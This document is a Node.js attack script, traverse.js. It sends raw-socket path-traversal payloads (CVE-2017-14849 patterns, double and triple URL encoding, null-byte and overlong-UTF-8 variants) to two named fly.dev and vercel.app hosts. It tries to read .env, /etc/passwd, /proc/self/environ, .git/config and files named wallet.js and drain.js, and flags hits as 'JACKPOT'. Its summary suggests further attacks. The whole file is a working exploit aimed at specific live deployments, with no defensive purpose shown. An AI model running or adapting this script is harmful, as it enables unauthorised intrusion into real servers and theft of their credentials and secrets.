#!/usr/bin/env node
/**
 * traverse.js — Focused path-traversal probe for /assets/ static serving
 *
 * The parent exploit.js Vector 6 came back "empty" because Node's `new URL()`
 * parser normalizes %2F -> / and collapses ../ segments BEFORE the request is
 * sent. Every encoded payload was silently rewritten into a harmless path and
 * either 404'd or 403'd, then filtered out.
 *
 * This probe fixes that by writing the request line RAW (manual socket), so the
 * exact byte sequence we craft is what hits the wire. It also:
 *   - covers the full CVE-2017-14849 payload family
 *   - probes both the Fly.io backend AND the new Vercel front-end (assets may
 *     be served from either, and Vercel's static handling differs)
 *   - classifies hits by content-type / magic-byte sniffing, not just status
 *   - does NOT filter 403/404 — those are reported too, because a 403 on a
 *     traversal path but 404 on a non-existent path is a meaningful signal
 *
 * Usage:  node scripts/traverse.js
 */

const tls = require("tls");
const net = require("net");

// ── Targets ────────────────────────────────────────────────────────────────
// Backend: confirmed serving /assets/new-tutorial-gif.mp4 (200, binary mp4)
// Frontend: latest rotation, may proxy /assets/ to the backend or serve its own
const TARGETS = [
  {
    name: "fly-backend",
    host: "backend-main-proud-frost-1362.fly.dev",
    port: 443,
    tls: true,
    // baseline sanity file we know returns 200
    baseline: "/assets/new-tutorial-gif.mp4",
  },
  {
    name: "vercel-frontend",
    host: "helsinki-blake-pulse97-67ef.vercel.app",
    port: 443,
    tls: true,
    baseline: "/",
  },
];

// ── Payload set ────────────────────────────────────────────────────────────
// Goal files on a Node/Fly.io deployment. Ordered roughly by value.
const GOAL_FILES = [
  ".env",
  "fly.toml",
  "Dockerfile",
  "package.json",
  "package-lock.json",
  "server.js",
  "app.js",
  "index.js",
  "config.js",
  "config.json",
  ".git/config",
  ".git/HEAD",
  "ecosystem.config.js",
  "tsconfig.json",
  "drain.js",
  "wallet.js",
  "src/index.js",
  "src/server.js",
  "../.env",
  "../../.env",
  "/etc/passwd",
  "/proc/self/environ",
  "/proc/self/cmdline",
  "/proc/1/environ",
];

// Encoders / bypass variants. Each takes a goal path and returns the raw
// request-path string to put on the wire (no further encoding applied).
const ENCODERS = {
  // Classic — Node URL would collapse this, so it MUST go raw
  "dotdot-slash": (g) => "/assets/../" + g,

  // Single URL-encoded ../  (%2F = /)
  "enc-once": (g) => "/assets/..%2F" + g,

  // Two-deep encoded
  "enc-twice": (g) => "/assets/..%2F..%2F" + g,

  // CVE-2017-14849 canonical pattern — works on express < 4.15.5
  // /static/../../../a/../../../etc/passwd
  "cve-2017-14849": (g) =>
    "/assets/../../../a/../../../" + g.replace(/^\//, ""),

  // Double-encoded — %25 = %, so %252e = %2e = .
  // Defeats a single decode pass before path resolution
  "dbl-enc": (g) => "/assets/%252e%252e%252f" + g,

  // Double-encoded, two-deep
  "dbl-enc-2": (g) => "/assets/%252e%252e%252f%252e%252e%252f" + g,

  // Mixed: literal .. with encoded slash
  "mixed": (g) => "/assets/..%2f" + g,

  // Overlong UTF-8 for . (0xC0 0xAE) — old IIS classic, rarely works on
  // Node but cheap to try
  "utf8-overlong": (g) => "/assets/..%c0%ae/" + g,

  // Bypass via backslash (Windows-style) — harmless to try
  "backslash": (g) => "/assets/..%5c" + g,

  // Truncation trick — some routers strip ..\ after a long prefix
  "long-prefix": (g) => "/assets/" + "a".repeat(200) + "/../" + g,

  // Null byte — older Node / express terminated paths at %00
  "null-byte": (g) => "/assets/..%00/" + g,

  // Dotless — ..%2f with a leading legit segment to avoid naive filters
  "nested": (g) => "/assets/sub/../../" + g,

  // URL-encoded full dots
  "full-enc": (g) => "/assets/%2e%2e%2f" + g,

  // Triple-encoded
  "triple-enc": (g) => "/assets/%25252e%25252e%25252f" + g,

  // No /assets prefix at all — sometimes express.static root is the app root
  "no-prefix": (g) => "/" + g,

  // Prefix with redundant /./
  "dot-slash": (g) => "/assets/./../" + g,

  // Encoded slash variants
  "enc-slash-fwd": (g) => "/assets/..%2F" + g,
  "enc-slash-back": (g) => "/assets/..%5C" + g,
};

// ── Low-level raw request ──────────────────────────────────────────────────
// We bypass `new URL()` entirely. We open a TLS socket and write the HTTP
// request line by hand so the path bytes are EXACTLY what we specify.
function rawRequest(host, port, useTls, rawPath, timeoutMs = 8000) {
  return new Promise((resolve) => {
    const socket = useTls
      ? tls.connect({ host, port, servername: host, rejectUnauthorized: false })
      : net.connect({ host, port });

    const chunks = [];
    let settled = false;

    const finish = (result) => {
      if (settled) return;
      settled = true;
      try {
        socket.destroy();
      } catch {}
      resolve(result);
    };

    socket.setTimeout(timeoutMs);
    socket.on("secureConnect", () => {
      // Build request manually. Path is injected raw — NO normalization.
      const reqLine =
        `GET ${rawPath} HTTP/1.1\r\n` +
        `Host: ${host}\r\n` +
        `User-Agent: traverse-probe/1.0\r\n` +
        `Accept: */*\r\n` +
        `Connection: close\r\n\r\n`;
      socket.write(reqLine);
    });
    socket.on("connect", () => {
      if (useTls) return; // wait for secureConnect
      const reqLine =
        `GET ${rawPath} HTTP/1.1\r\n` +
        `Host: ${host}\r\n` +
        `User-Agent: traverse-probe/1.0\r\n` +
        `Accept: */*\r\n` +
        `Connection: close\r\n\r\n`;
      socket.write(reqLine);
    });
    socket.on("data", (chunk) => chunks.push(chunk));
    socket.on("end", () => {
      const buf = Buffer.concat(chunks);
      finish(parseHttpResponse(buf, rawPath));
    });
    socket.on("timeout", () =>
      finish({ status: 0, body: "[TIMEOUT]", headers: {}, path: rawPath })
    );
    socket.on("error", (e) =>
      finish({
        status: 0,
        body: `[ERROR: ${e.message}]`,
        headers: {},
        path: rawPath,
      })
    );
  });
}

// Parse raw HTTP response buffer into status / headers / body
function parseHttpResponse(buf, path) {
  const headEnd = buf.indexOf("\r\n\r\n");
  if (headEnd === -1) {
    return { status: 0, body: "[NO-HTTP-RESPONSE]", headers: {}, path };
  }
  const head = buf.slice(0, headEnd).toString("latin1");
  const bodyBuf = buf.slice(headEnd + 4);
  const lines = head.split("\r\n");
  const statusLine = lines[0];
  const m = statusLine.match(/HTTP\/[\d.]+ (\d+)/);
  const status = m ? parseInt(m[1], 10) : 0;
  const headers = {};
  for (const line of lines.slice(1)) {
    const idx = line.indexOf(":");
    if (idx > -1) {
      headers[line.slice(0, idx).trim().toLowerCase()] = line
        .slice(idx + 1)
        .trim();
    }
  }
  return {
    status,
    headers,
    body: bodyBuf,
    bodyText: bodyBuf.toString("utf8"),
    path,
  };
}

// ── Hit classification ─────────────────────────────────────────────────────
// We're not just looking for 200 — a 200 on .env is the jackpot, but we also
// want to surface 403 (file exists but traversal blocked — confirms presence)
// and surprising content-types (e.g. application/octet-stream on .env).
const SIG_BYTES = {
  ".env": [Buffer.from([0x23]) /* # */, null], // .env often starts with # comment
  "fly.toml": null,
  "package.json": [Buffer.from("{")],
  "Dockerfile": [Buffer.from("FROM"), Buffer.from("#")],
  ".git/config": [Buffer.from("[core]")],
  ".git/HEAD": [Buffer.from("ref:")],
  "/etc/passwd": [Buffer.from("root:x:")],
  "/proc/self/environ": null,
  "server.js": [Buffer.from("require("), Buffer.from("const "), Buffer.from("import ")],
};

function classify(goal, res) {
  const ct = (res.headers["content-type"] || "").toLowerCase();
  const body = res.body || Buffer.alloc(0);
  const bodyStr = res.bodyText || "";
  const reasons = [];

  // Jackpot: 200 + looks like the file
  if (res.status === 200) {
    // Content-type check
    if (
      ct.includes("text/plain") ||
      ct.includes("application/json") ||
      ct.includes("application/octet-stream") ||
      ct.includes("application/x-toml") ||
      ct.includes("application/toml") ||
      ct === ""
    ) {
      reasons.push(`200 + ${ct || "no-ct"}`);
    }
    // Signature byte check
    const sigs = SIG_BYTES[goal];
    if (sigs) {
      for (const sig of sigs) {
        if (sig && body.slice(0, sig.length).equals(sig)) {
          reasons.push("SIG-MATCH");
          break;
        }
      }
    }
    // Heuristic: body contains env-like key=value pairs
    if (goal === ".env" && /^[A-Z_]+=.+/m.test(bodyStr)) {
      reasons.push("ENV-KEY=VAL");
    }
    if (goal === "fly.toml" && /(app|kill_timeout|deploy|primary_region)\s*=/.test(bodyStr)) {
      reasons.push("FLY-TOML-SHAPE");
    }
    if (goal === "package.json" && bodyStr.trimStart().startsWith("{")) {
      try {
        const j = JSON.parse(bodyStr);
        if (j.name || j.dependencies) reasons.push("PACKAGE-JSON-VALID");
      } catch {}
    }
    if (goal === "/etc/passwd" && /^root:x:0:/m.test(bodyStr)) {
      reasons.push("ETC-PASSWD-ROOT");
    }
    if (goal === "/proc/self/environ" && /[A-Z_]+=/.test(bodyStr)) {
      reasons.push("ENVIRON-SHAPE");
    }
  }

  // Interesting non-200: 403 means "found but forbidden" — strong signal
  if (res.status === 403) reasons.push("403-FORBIDDEN");
  // 500 on traversal = unhandled error in static middleware = interesting
  if (res.status === 500) reasons.push("500-SERVER-ERROR");
  // Redirect — might point at the real asset root
  if (res.status >= 300 && res.status < 400) {
    reasons.push(`${res.status}-REDIRECT→${res.headers["location"] || "?"}`);
  }

  return reasons;
}

// ── Main ───────────────────────────────────────────────────────────────────
async function main() {
  console.log(
    "╔════════════════════════════════════════════════════════════════════╗"
  );
  console.log(
    "║  PATH TRAVERSAL PROBE — /assets/ static serving                    ║"
  );
  console.log(
    "║  Raw-socket (bypasses Node URL normalization)                      ║"
  );
  console.log(
    "╚════════════════════════════════════════════════════════════════════╝"
  );

  const hits = [];
  const allResults = [];

  for (const target of TARGETS) {
    console.log(`\n──────────────────────────────────────────────────────────────`);
    console.log(
      `TARGET: ${target.name}  →  ${target.host}:${target.port}  (${
        target.tls ? "TLS" : "TCP"
      })`
    );
    console.log(`──────────────────────────────────────────────────────────────`);

    // Baseline: confirm the asset path is live
    const baseline = await rawRequest(
      target.host,
      target.port,
      target.tls,
      target.baseline
    );
    console.log(
      `  [baseline] ${target.baseline} → ${baseline.status} ${
        baseline.headers["content-type"] || ""
      } ${baseline.body ? `(${baseline.body.length} bytes)` : ""}`
    );
    if (baseline.status !== 200) {
      console.log(
        `  [!] Baseline did not return 200 — assets may not be served here. Proceeding anyway.`
      );
    }

    let payloadCount = 0;
    let totalPayloads = GOAL_FILES.length * Object.keys(ENCODERS).length;
    console.log(
      `  Testing ${GOAL_FILES.length} goal files × ${
        Object.keys(ENCODERS).length
      } encoders = ${totalPayloads} payloads\n`
    );

    for (const goal of GOAL_FILES) {
      for (const [encName, encoder] of Object.entries(ENCODERS)) {
        const rawPath = encoder(goal);
        const res = await rawRequest(
          target.host,
          target.port,
          target.tls,
          rawPath
        );
        payloadCount++;

        const reasons = classify(goal, res);
        allResults.push({
          target: target.name,
          goal,
          encoder: encName,
          path: rawPath,
          status: res.status,
          reasons,
          ct: res.headers["content-type"] || "",
          len: res.body ? res.body.length : 0,
        });

        // Only print interesting results to keep output readable
        if (reasons.length > 0) {
          const tag = reasons.includes("SIG-MATCH") ||
            reasons.includes("ENV-KEY=VAL") ||
            reasons.includes("FLY-TOML-SHAPE") ||
            reasons.includes("PACKAGE-JSON-VALID") ||
            reasons.includes("ETC-PASSWD-ROOT") ||
            reasons.includes("ENVIRON-SHAPE")
            ? " ★★★ JACKPOT"
            : reasons.includes("403-FORBIDDEN") ||
              reasons.includes("500-SERVER-ERROR")
            ? " ★★"
            : " ★";

          console.log(
            `  [${res.status}]${tag} ${encName.padEnd(16)} → ${goal}`
          );
          console.log(
            `         path: ${rawPath}`
          );
          console.log(
            `         reasons: ${reasons.join(", ")}  | ct: ${
              res.headers["content-type"] || "?"
            } | len: ${res.body ? res.body.length : 0}`
          );

          if (res.bodyText && (res.status === 200 || res.status === 500)) {
            const preview = res.bodyText
              .substring(0, 600)
              .replace(/\r\n/g, "\n");
            console.log(`         ┌─ body ─────────────────────────────────`);
            preview.split("\n").forEach((l) =>
              console.log(`         │ ${l}`)
            );
            console.log(`         └──────────────────────────────────────`);
          }

          hits.push({
            target: target.name,
            goal,
            encoder: encName,
            path: rawPath,
            status: res.status,
            reasons,
            body: res.bodyText ? res.bodyText.substring(0, 2000) : "",
          });
        }

        // Tiny delay to avoid rate-limiting / connection exhaustion
        await new Promise((r) => setTimeout(r, 50));
      }
    }
    console.log(`\n  ${payloadCount} payloads sent.`);
  }

  // ── Summary ──────────────────────────────────────────────────────────────
  console.log(
    "\n╔════════════════════════════════════════════════════════════════════╗"
  );
  console.log(
    "║  SUMMARY                                                          ║"
  );
  console.log(
    "╚════════════════════════════════════════════════════════════════════╝"
  );
  console.log(`  Total payloads:   ${allResults.length}`);
  console.log(`  Interesting hits: ${hits.length}`);

  const statusBreakdown = {};
  for (const r of allResults) {
    statusBreakdown[r.status] = (statusBreakdown[r.status] || 0) + 1;
  }
  console.log(`  Status breakdown: ${JSON.stringify(statusBreakdown)}`);

  if (hits.length === 0) {
    console.log(
      "\n  No traversal confirmed. The /assets/ static serving appears hardened."
    );
    console.log("  Next options:");
    console.log("    - Probe for source maps (.js.map) on served JS bundles");
    console.log("    - Test POST/PUT/OPTIONS on /assets/ for write primitives");
    console.log("    - Look for server-side template injection in error pages");
  } else {
    const jackpots = hits.filter(
      (h) =>
        h.reasons.includes("SIG-MATCH") ||
        h.reasons.includes("ENV-KEY=VAL") ||
        h.reasons.includes("FLY-TOML-SHAPE") ||
        h.reasons.includes("PACKAGE-JSON-VALID") ||
        h.reasons.includes("ETC-PASSWD-ROOT") ||
        h.reasons.includes("ENVIRON-SHAPE")
    );
    console.log(`  ★★★ JACKPOT hits: ${jackpots.length}`);
    for (const h of jackpots) {
      console.log(
        `\n  >>> ${h.target} | ${h.encoder} | ${h.goal} | ${h.status}`
      );
      console.log(`      ${h.path}`);
      if (h.body) {
        console.log("      BODY (first 2KB):");
        h.body
          .substring(0, 2000)
          .split("\n")
          .forEach((l) => console.log(`        ${l}`));
      }
    }
  }

  console.log(
    "\n╔════════════════════════════════════════════════════════════════════╗"
  );
  console.log(
    "║  TRAVERSAL PROBE COMPLETE                                          ║"
  );
  console.log(
    "╚════════════════════════════════════════════════════════════════════╝\n"
  );
}

main().catch((e) => {
  console.error("Fatal:", e);
  process.exit(1);
});
